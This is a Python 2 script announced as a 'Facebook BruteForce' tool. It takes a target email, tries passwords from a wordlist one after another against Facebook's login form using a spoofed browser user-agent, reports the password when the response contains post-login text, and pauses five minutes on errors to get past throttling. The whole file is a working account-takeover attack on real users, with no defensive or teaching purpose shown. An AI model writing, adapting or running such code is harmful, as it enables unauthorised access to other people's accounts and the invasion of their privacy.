import time
import sys

if sys.version_info[0] !=2: 
  print('''--------------------------------------
  REQUIRED PYTHON 2.x
  use: python fb2.py
--------------------------------------
      ''')
  sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
  import mechanize
  import urllib2
  browser = mechanize.Browser()
  browser.addheaders = [('User-Agent',headers['User-Agent'])]
  browser.set_handle_robots(False)
except:
  print('\n\tPlease install mechanize.\n')
  sys.exit()

print('\n---------- Welcome To Facebook BruteForce ----------\n')
print('\n ____             _        __                _____  \n')
print('\n | __ ) _ __ _   _| |_ ___ / _| ___  _ __ ___|___ / \n')
print('\n |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __| |_ \ \n')
print('\n | |_) | |  | |_| | ||  __/  _| (_) | | | (__ ___) |\n')
print('\n |____/|_|   \__,_|\__\___|_|  \___/|_|  \___|____/ \n')




file=open('password.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print ("\nTarget Email ID : ",email)
print "\nTrying Passwords from list ..."

i=0
while file:
  passw=file.readline().strip()
  i+=1
  if len(passw) < 6:
    continue
  print str(i) +" : ",passw
  response = browser.open(post_url)
  try:
    if response.code == 200:
      browser.select_form(nr=0)
      browser.form['email'] = email
      browser.form['pass'] = passw
      response = browser.submit()
      response_data = response.read()
      if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
        print('Your password is : ',passw)
        break
  except:
    print('\nSleeping for time : 5 min\n')
    time.sleep(300)